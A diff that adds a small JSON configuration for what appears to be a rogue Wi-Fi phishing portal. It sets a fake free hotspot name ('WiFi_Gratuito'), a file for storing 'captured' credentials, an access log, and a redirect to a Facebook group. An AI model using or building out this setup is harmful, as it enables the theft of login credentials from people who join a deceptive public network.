@@ -1,0 +1,8 @@
+{
+  "redirect_url": "https://www.facebook.com/groups/SEU_ID_GRUPO",
+  "port": 8080,
+  "credentials_file": "credentials/captured.json",
+  "log_file": "logs/access.log",
+  "hotspot_ssid": "WiFi_Gratuito",
+  "version": "3.0"
+}
